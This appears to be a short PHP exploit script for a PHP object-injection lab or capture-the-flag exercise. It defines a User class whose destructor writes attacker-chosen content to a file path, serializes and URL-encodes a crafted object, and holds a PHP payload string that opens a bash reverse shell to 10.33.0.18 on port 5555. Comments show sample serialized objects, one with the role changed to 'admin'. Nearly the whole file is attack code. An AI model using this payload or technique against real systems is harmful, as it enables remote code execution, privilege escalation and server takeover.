<?php

class User {
  // Properties
  public $username;
  public $password;
  public $role;
  public $log = False;
  public $path = '/tmp'; 

  // Methods

  function set_username($username) {
    $this->username = $username;
  }
  function set_password($password) {
    $this->password = $password;
  }
  function set_role($role) {
    $this->role = $role;
  }
  function get_username() {
    return $this->username;
  }
  function get_password(){
    return $this->password;
  } 
  function get_role() {
    return $this->role;
  }
  function get_path() {
    return $this->log_path;
  }
  function __construct() {
    $this->path = '/tmp/me.php';
  }
  function __destruct() {
    if($this->log){
    	file_put_contents($this->path, date("H:i").$this->username.":".$this->role);
    }
  }
}
// me user
$me = new User();
$me->set_username('me');
$me->set_password('me');
$me->set_role('user');
$path= '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.33.0.18/5555 0>&1\'"); ?>';

print urlencode(serialize($me));

// O:4:"User":5:{s:8:"username";s:2:"me";s:8:"password";s:2:"me";s:4:"role";s:5:"admin";s:3:"log";b:0;s:4:"path";s:13:"/tmp/1054.log";}  
// O:4:"User":5:{s:8:"username";s:2:"me";s:8:"password";s:2:"me";s:4:"role";s:4:"user";s:3:"log";b:0;s:4:"path";s:13:"/tmp/2354.log";} 
?> 